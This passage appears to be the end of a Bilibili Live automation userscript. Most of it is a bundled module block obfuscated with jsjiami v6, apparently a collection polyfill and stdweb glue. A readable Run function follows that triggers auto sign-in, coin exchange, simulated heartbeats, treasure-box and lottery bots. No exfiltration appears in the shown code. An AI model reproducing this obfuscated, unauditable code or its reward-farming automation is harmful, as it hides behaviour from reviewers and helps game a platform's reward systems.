_0x4cacf4={'\x6e\x64\x4b\x57\x52':function(_0x333d42,_0x45c8fd,_0x517233){return _0x15157b['\x53\x4d\x67\x58\x51'](_0x333d42,_0x45c8fd,_0x517233);},'\x45\x66\x70\x48\x67':function(_0x358842,_0x45f67a){return _0x15157b['\x73\x54\x51\x77\x6f'](_0x358842,_0x45f67a);},'\x42\x64\x6a\x65\x66':_0x15157b[_0x52b8('419','\x56\x74\x75\x5b')],'\x41\x4c\x58\x76\x4e':_0x15157b[_0x52b8('41a','\x75\x40\x21\x64')]};var _0x2cc028=_0x15157b[_0x52b8('41b','\x47\x38\x41\x23')](_0x15c5b0,this['\x61'],function(_0x2cc028){var _0xd866db={'\x42\x66\x76\x57\x46':function(_0xe1d956,_0x276ea8,_0x2f2b45){return _0x4cacf4[_0x52b8('41c','\x5e\x41\x36\x4b')](_0xe1d956,_0x276ea8,_0x2f2b45);}};if(_0x4cacf4['\x45\x66\x70\x48\x67'](_0x4cacf4[_0x52b8('41d','\x49\x43\x28\x41')],_0x4cacf4['\x41\x4c\x58\x76\x4e'])){var _0x474ab6=_0xd866db[_0x52b8('41e','\x2a\x47\x64\x5e')](_0x1b28f6,this,_0x2aa728);_0x474ab6?_0x474ab6[0x1]=_0x2cc028:this['\x61']['\x70\x75\x73\x68']([_0x2aa728,_0x2cc028]);}else{return _0x4cacf4[_0x52b8('41f','\x55\x4e\x45\x6d')](_0x2cc028[0x0],_0x2aa728);}});return~_0x2cc028&&this['\x61'][_0x52b8('420','\x56\x74\x75\x5b')](_0x2cc028,0x1),!!~_0x2cc028;}},_0x2aa728['\x65\x78\x70\x6f\x72\x74\x73']={'\x67\x65\x74\x43\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72':function(_0x2aa728,_0x2cc028,_0x5dc11c,_0x5bd09b){var _0x3bf113={'\x4f\x52\x53\x6b\x69':function(_0x2d5dfa,_0x46f67c){return _0x15157b[_0x52b8('421','\x56\x74\x75\x5b')](_0x2d5dfa,_0x46f67c);},'\x68\x45\x4a\x51\x66':function(_0x5b7d38,_0x2b3a9f){return _0x15157b[_0x52b8('422','\x56\x24\x55\x57')](_0x5b7d38,_0x2b3a9f);}};if(_0x15157b[_0x52b8('423','\x67\x56\x57\x47')](_0x15157b['\x59\x57\x4b\x6e\x52'],_0x15157b[_0x52b8('424','\x75\x40\x21\x64')])){var _0x5991c9=_0x2aa728[_0x52b8('425','\x61\x44\x73\x29')][_0x15157b[_0x52b8('426','\x25\x28\x75\x71')](_0x2cc028,0x4)],_0x327320=_0x2aa728[_0x52b8('1ba','\x42\x79\x6b\x23')][_0x15157b['\x68\x4a\x76\x41\x57'](_0x15157b[_0x52b8('427','\x42\x43\x4a\x50')](_0x2cc028,0x4),0x4)];return _0x2aa728['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45']['\x74\x6f\x5f\x6a\x73\x5f\x73\x74\x72\x69\x6e\x67'](_0x5991c9,_0x327320);}else{var _0x49ab58=_0x15157b['\x57\x79\x58\x44\x67'](_0x2aa728,function(_0x2aa728,_0x36da4d){_0x15157b[_0x52b8('428','\x56\x74\x75\x5b')](_0x30d37f,_0x2aa728,_0x49ab58,_0x2cc028,'\x5f\x69'),_0x2aa728['\x5f\x74']=_0x2cc028,_0x2aa728['\x5f\x69']=_0x5c4361++,_0x2aa728['\x5f\x6c']=void 0x0,_0x15157b['\x67\x68\x4f\x74\x56'](void 0x0,_0x36da4d)&&_0x15157b[_0x52b8('429','\x42\x43\x4a\x50')](_0x325adf,_0x36da4d,_0x5dc11c,_0x2aa728[_0x5bd09b],_0x2aa728);});return _0x15157b[_0x52b8('42a','\x28\x25\x25\x25')](_0x36da4d,_0x49ab58[_0x52b8('42b','\x2a\x47\x64\x5e')],{'\x64\x65\x6c\x65\x74\x65':function(_0x2aa728){if(!_0x15157b[_0x52b8('42c','\x61\x44\x73\x29')](_0x1d0c29,_0x2aa728))return!0x1;var _0x5dc11c=_0x15157b[_0x52b8('42d','\x65\x34\x59\x79')](_0x578125,_0x2aa728);return _0x15157b[_0x52b8('42e','\x70\x59\x54\x65')](!0x0,_0x5dc11c)?_0x15157b[_0x52b8('42d','\x65\x34\x59\x79')](_0x3b94e8,_0x15157b[_0x52b8('42f','\x49\x43\x28\x41')](_0x317dc6,this,_0x2cc028))[_0x52b8('430','\x42\x43\x4a\x50')](_0x2aa728):_0x5dc11c&&_0x15157b['\x58\x53\x50\x4e\x49'](_0x1a05ba,_0x5dc11c,this['\x5f\x69'])&&delete _0x5dc11c[this['\x5f\x69']];},'\x68\x61\x73':function(_0x2aa728){if(_0x15157b[_0x52b8('431','\x28\x25\x25\x25')](_0x15157b[_0x52b8('432','\x62\x62\x29\x6a')],_0x15157b[_0x52b8('433','\x5e\x41\x36\x4b')])){var _0x1d2ade=_0x2aa728['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45'][_0x52b8('434','\x56\x74\x75\x5b')](_0x5dc11c);_0x2aa728['\x48\x45\x41\x50\x55\x38'][_0x3bf113['\x4f\x52\x53\x6b\x69'](_0x2cc028,0xc)]=0xf,_0x2aa728[_0x52b8('435','\x55\x4e\x45\x6d')][_0x3bf113['\x68\x45\x4a\x51\x66'](_0x2cc028,0x4)]=_0x1d2ade;}else{if(!_0x15157b[_0x52b8('436','\x42\x43\x4a\x50')](_0x1d0c29,_0x2aa728))return!0x1;var _0x5dc11c=_0x15157b['\x56\x69\x78\x45\x50'](_0x578125,_0x2aa728);return _0x15157b[_0x52b8('437','\x76\x46\x41\x68')](!0x0,_0x5dc11c)?_0x15157b[_0x52b8('438','\x66\x47\x4f\x5b')](_0x3b94e8,_0x15157b[_0x52b8('439','\x59\x73\x7a\x26')](_0x317dc6,this,_0x2cc028))[_0x52b8('43a','\x70\x59\x54\x65')](_0x2aa728):_0x5dc11c&&_0x15157b[_0x52b8('43b','\x34\x6f\x33\x70')](_0x1a05ba,_0x5dc11c,this['\x5f\x69']);}}}),_0x49ab58;}},'\x64\x65\x66':function(_0x2aa728,_0x2cc028,_0x5dc11c){var _0x36da4d=_0x15157b[_0x52b8('43c','\x59\x73\x7a\x26')](_0x578125,_0x15157b[_0x52b8('43d','\x5d\x47\x45\x51')](_0x5bd09b,_0x2cc028),!0x0);return _0x15157b['\x57\x61\x6d\x73\x71'](!0x0,_0x36da4d)?_0x15157b['\x6c\x6a\x63\x53\x6a'](_0x3b94e8,_0x2aa728)[_0x52b8('43e','\x49\x43\x28\x41')](_0x2cc028,_0x5dc11c):_0x36da4d[_0x2aa728['\x5f\x69']]=_0x5dc11c,_0x2aa728;},'\x75\x66\x73\x74\x6f\x72\x65':_0x3b94e8};},896:function(_0x4da008,_0x4f2506,_0x548195){var _0x2b5796={'\x59\x6d\x72\x4b\x61':function(_0x24143f,_0x1dbcbd){return _0x24143f!==_0x1dbcbd;},'\x50\x44\x65\x44\x7a':_0x52b8('43f','\x55\x71\x73\x58'),'\x7a\x48\x46\x53\x61':'\x44\x4f\x55\x69\x6b','\x46\x71\x59\x72\x68':function(_0x366600,_0x438b4b,_0x1f4a9d){return _0x366600(_0x438b4b,_0x1f4a9d);},'\x70\x6a\x69\x7a\x59':function(_0x577536,_0x20ff3c){return _0x577536>_0x20ff3c;},'\x59\x4e\x50\x7a\x69':function(_0x285ea9,_0x3e9ab2){return _0x285ea9+_0x3e9ab2;},'\x59\x53\x46\x47\x43':function(_0x3ee87c,_0x238ae8){return _0x3ee87c(_0x238ae8);},'\x59\x69\x4b\x54\x44':function(_0x14ab41,_0x5dbf15){return _0x14ab41===_0x5dbf15;},'\x58\x74\x43\x51\x58':_0x52b8('440','\x46\x4b\x78\x79'),'\x70\x6b\x6b\x6d\x63':function(_0x3816b3,_0x31b6d6){return _0x3816b3(_0x31b6d6);},'\x6a\x6d\x7a\x77\x72':_0x52b8('441','\x29\x7a\x73\x5b'),'\x4e\x70\x59\x74\x66':function(_0x13a144,_0x17b98b){return _0x13a144(_0x17b98b);},'\x6b\x46\x68\x61\x50':function(_0x183f58,_0x1e550b){return _0x183f58==_0x1e550b;},'\x66\x55\x6a\x45\x76':_0x52b8('442','\x25\x28\x75\x71'),'\x50\x4e\x52\x46\x52':function(_0x3183ce,_0x5d8b5e,_0x139170,_0x137a4f){return _0x3183ce(_0x5d8b5e,_0x139170,_0x137a4f);},'\x7a\x6f\x74\x49\x67':function(_0x43f40b,_0x587405){return _0x43f40b(_0x587405);},'\x4e\x70\x62\x4b\x49':function(_0x58b661,_0x353401){return _0x58b661(_0x353401);},'\x46\x6d\x45\x76\x47':function(_0x5c732d,_0x44d351){return _0x5c732d in _0x44d351;},'\x46\x77\x79\x64\x74':_0x52b8('443','\x59\x73\x7a\x26'),'\x73\x62\x4a\x61\x55':function(_0x1fcb50,_0x4da66e){return _0x1fcb50&&_0x4da66e;},'\x5a\x43\x57\x42\x46':function(_0x4e0b02,_0x5ef3ba,_0x566887){return _0x4e0b02(_0x5ef3ba,_0x566887);},'\x49\x52\x79\x72\x43':function(_0x2038a4,_0x88a557,_0x5180ad){return _0x2038a4(_0x88a557,_0x5180ad);},'\x7a\x72\x74\x76\x49':_0x52b8('444','\x64\x5e\x23\x6e'),'\x6b\x69\x6d\x45\x57':_0x52b8('445','\x64\x44\x63\x54'),'\x4b\x68\x5a\x52\x7a':'\x67\x65\x74'};'use strict';var _0x5a7a95,_0x417631=_0x2b5796['\x4e\x70\x59\x74\x66'](_0x548195,0xa),_0x3b5c57=_0x2b5796[_0x52b8('446','\x5d\x63\x5a\x66')](_0x548195,0x1dd)(0x0),_0x161fd7=_0x2b5796[_0x52b8('447','\x51\x5b\x73\x47')](_0x548195,0x82),_0x13eaf5=_0x2b5796[_0x52b8('448','\x28\x25\x25\x25')](_0x548195,0xb4),_0x46ae6c=_0x2b5796[_0x52b8('449','\x6b\x6f\x29\x50')](_0x548195,0xb9),_0x47f03b=_0x2b5796[_0x52b8('44a','\x67\x56\x57\x47')](_0x548195,0x37f),_0x588a40=_0x2b5796[_0x52b8('44b','\x31\x31\x78\x6c')](_0x548195,0x1f),_0x31cd92=_0x2b5796[_0x52b8('44c','\x6b\x6f\x29\x50')](_0x548195,0x19b),_0x1a3f17=_0x2b5796[_0x52b8('44d','\x64\x44\x63\x54')](_0x548195,0x19b),_0x4f0d56=!_0x417631[_0x52b8('44e','\x61\x44\x73\x29')]&&_0x2b5796[_0x52b8('44f','\x55\x4e\x45\x6d')](_0x2b5796[_0x52b8('450','\x33\x77\x24\x77')],_0x417631),_0x5c3fa8=_0x13eaf5['\x67\x65\x74\x57\x65\x61\x6b'],_0x2d6358=Object[_0x52b8('451','\x42\x43\x4a\x50')],_0x3f68e0=_0x47f03b[_0x52b8('452','\x25\x28\x75\x71')],_0x4cb389=function(_0x4da008){return function(){if(_0x2b5796['\x59\x6d\x72\x4b\x61'](_0x2b5796[_0x52b8('453','\x61\x44\x73\x29')],_0x2b5796[_0x52b8('454','\x28\x64\x70\x75')])){return _0x2b5796[_0x52b8('455','\x55\x71\x73\x58')](_0x4da008,this,_0x2b5796[_0x52b8('456','\x55\x4e\x45\x6d')](arguments[_0x52b8('457','\x64\x44\x63\x54')],0x0)?arguments[0x0]:void 0x0);}else{var _0x224689=_0x4da008[_0x52b8('2c','\x55\x63\x50\x2a')][_0x52b8('458','\x28\x64\x70\x75')](0x10);return _0x4da008['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45'][_0x52b8('245','\x47\x38\x41\x23')](_0x224689,_0x4f2506),_0x224689;}};},_0x524c21={'\x67\x65\x74':function(_0x4da008){var _0x1562ef={'\x49\x54\x61\x66\x4d':function(_0x45d2ca,_0x345a93){return _0x2b5796[_0x52b8('459','\x70\x66\x40\x6e')](_0x45d2ca,_0x345a93);}};if(_0x2b5796[_0x52b8('45a','\x42\x43\x4a\x50')](_0x588a40,_0x4da008)){if(_0x2b5796['\x59\x69\x4b\x54\x44'](_0x2b5796['\x58\x74\x43\x51\x58'],_0x2b5796['\x58\x74\x43\x51\x58'])){var _0x4f2506=_0x2b5796['\x70\x6b\x6b\x6d\x63'](_0x5c3fa8,_0x4da008);return _0x2b5796[_0x52b8('45b','\x67\x26\x4d\x4e')](!0x0,_0x4f2506)?_0x2b5796['\x70\x6b\x6b\x6d\x63'](_0x3f68e0,_0x2b5796['\x46\x71\x59\x72\x68'](_0x31cd92,this,_0x2b5796[_0x52b8('45c','\x70\x58\x38\x32')]))[_0x52b8('45d','\x61\x44\x73\x29')](_0x4da008):_0x4f2506?_0x4f2506[this['\x5f\x69']]:void 0x0;}else{return _0x548195[_0x52b8('45e','\x32\x4b\x4d\x68')](_0x4da008[_0x52b8('45f','\x55\x4e\x45\x6d')]['\x73\x75\x62\x61\x72\x72\x61\x79'](_0x4f2506,_0x1562ef[_0x52b8('460','\x5d\x47\x45\x51')](_0x4f2506,_0x5a7a95)));}}},'\x73\x65\x74':function(_0x4da008,_0x4f2506){return _0x47f03b[_0x52b8('461','\x55\x71\x73\x58')](_0x2b5796[_0x52b8('462','\x6b\x6f\x29\x50')](_0x31cd92,this,_0x2b5796[_0x52b8('463','\x62\x62\x29\x6a')]),_0x4da008,_0x4f2506);}},_0x266c0e=_0x4da008[_0x52b8('464','\x47\x38\x41\x23')]=_0x2b5796[_0x52b8('465','\x56\x74\x75\x5b')](_0x548195,0x1f6)(_0x2b5796[_0x52b8('466','\x38\x50\x71\x53')],_0x4cb389,_0x524c21,_0x47f03b,!0x0,!0x0);_0x2b5796[_0x52b8('467','\x70\x59\x54\x65')](_0x1a3f17,_0x4f0d56)&&(_0x2b5796[_0x52b8('468','\x42\x43\x4a\x50')](_0x46ae6c,(_0x5a7a95=_0x47f03b[_0x52b8('469','\x5e\x41\x36\x4b')](_0x4cb389,_0x2b5796['\x6a\x6d\x7a\x77\x72']))[_0x52b8('46a','\x71\x41\x46\x73')],_0x524c21),_0x13eaf5[_0x52b8('46b','\x34\x6f\x33\x70')]=!0x0,_0x2b5796[_0x52b8('46c','\x66\x47\x4f\x5b')](_0x3b5c57,[_0x2b5796[_0x52b8('46d','\x31\x31\x78\x6c')],_0x2b5796['\x6b\x69\x6d\x45\x57'],_0x2b5796[_0x52b8('46e','\x73\x56\x6a\x39')],_0x2b5796[_0x52b8('46f','\x47\x38\x41\x23')]],function(_0x4da008){var _0x63c6d2={'\x4d\x52\x64\x75\x6d':function(_0x298cc1,_0x1ecf2b){return _0x2b5796['\x4e\x70\x59\x74\x66'](_0x298cc1,_0x1ecf2b);},'\x50\x72\x50\x53\x66':function(_0x48f9ac,_0x164b4f){return _0x2b5796[_0x52b8('470','\x5d\x63\x5a\x66')](_0x48f9ac,_0x164b4f);},'\x6f\x4e\x6b\x65\x71':_0x2b5796['\x66\x55\x6a\x45\x76']};var _0x4f2506=_0x266c0e['\x70\x72\x6f\x74\x6f\x74\x79\x70\x65'],_0x548195=_0x4f2506[_0x4da008];_0x2b5796[_0x52b8('471','\x64\x5e\x23\x6e')](_0x161fd7,_0x4f2506,_0x4da008,function(_0x4f2506,_0x417631){if(_0x63c6d2[_0x52b8('472','\x67\x26\x4d\x4e')](_0x588a40,_0x4f2506)&&!_0x63c6d2[_0x52b8('473','\x59\x73\x7a\x26')](_0x2d6358,_0x4f2506)){this['\x5f\x66']||(this['\x5f\x66']=new _0x5a7a95());var _0x3b5c57=this['\x5f\x66'][_0x4da008](_0x4f2506,_0x417631);return _0x63c6d2[_0x52b8('474','\x45\x31\x29\x5e')](_0x63c6d2['\x6f\x4e\x6b\x65\x71'],_0x4da008)?this:_0x3b5c57;}return _0x548195[_0x52b8('475','\x55\x71\x73\x58')](this,_0x4f2506,_0x417631);});}));},897:function(_0x319e08,_0x1f4f08,_0x199197){var _0x5e6b76={'\x75\x63\x77\x6e\x6a':function(_0x2511b6,_0x2a445a){return _0x2511b6(_0x2a445a);},'\x71\x4f\x72\x44\x55':function(_0x59f82e,_0x2e5dd0){return _0x59f82e(_0x2e5dd0);},'\x63\x6b\x77\x4a\x79':function(_0x2e2426,_0x4279e8){return _0x2e2426(_0x4279e8);},'\x46\x52\x67\x74\x47':function(_0x53c222,_0x4f3e05){return _0x53c222(_0x4f3e05);}};_0x5e6b76[_0x52b8('476','\x42\x43\x4a\x50')](_0x199197,0x80),_0x5e6b76[_0x52b8('477','\x6b\x6f\x29\x50')](_0x199197,0x57),_0x5e6b76[_0x52b8('478','\x40\x25\x53\x76')](_0x199197,0x380),_0x5e6b76[_0x52b8('479','\x29\x7a\x73\x5b')](_0x199197,0x37e),_0x5e6b76[_0x52b8('47a','\x49\x43\x28\x41')](_0x199197,0x37d),_0x319e08[_0x52b8('e5','\x29\x7a\x73\x5b')]=_0x5e6b76[_0x52b8('47b','\x52\x6e\x61\x4a')](_0x199197,0x7)[_0x52b8('47c','\x21\x50\x6b\x42')];},898:function(_0x1052c2,_0x2e0e43,_0x42d23c){var _0x535ba5={'\x7a\x68\x41\x4b\x76':function(_0x2ed810,_0x15af70){return _0x2ed810(_0x15af70);}};_0x1052c2['\x65\x78\x70\x6f\x72\x74\x73']={'\x64\x65\x66\x61\x75\x6c\x74':_0x535ba5[_0x52b8('47d','\x56\x74\x75\x5b')](_0x42d23c,0x381),'\x5f\x5f\x65\x73\x4d\x6f\x64\x75\x6c\x65':!0x0};}}]);;_0xodG='jsjiami.com.v6';

        const Run = async () => {
            await TokenLoad();
            // 每天一次
            Statistics.run();
            if (CONFIG.AUTO_SIGN) Sign.run();
            if (CONFIG.SILVER2COIN) Exchange.run();
            if (CONFIG.AUTO_GROUP_SIGN) GroupSign.run();
            if (CONFIG.AUTO_DAILYREWARD) DailyReward.run();
            if (CONFIG.MOBILE_HEARTBEAT) {
                MobileHeartbeat.run();
                WebHeartbeat.run();
            }
            //if (CONFIG.AUTO_GROUP_SIGN || CONFIG.AUTO_DAILYREWARD) createIframe('//api.live.bilibili.com', 'GROUPSIGN|DAILYREWARD');
            // 每过一定时间一次
            if (CONFIG.AUTO_TASK) Task.run();
            if (CONFIG.AUTO_GIFT) Gift.run();
            // 持续运行
            if (CONFIG.AUTO_TREASUREBOX) TreasureBox.run();
            if (CONFIG.AUTO_LOTTERY) Lottery.run();
            RafflePorcess.run();
            TopRankTask.run();
            HeartGift.run();
            BiliPush.run();
        };

        $(document).ready(() => {
            Init().then(Run);
        });
    }
})();
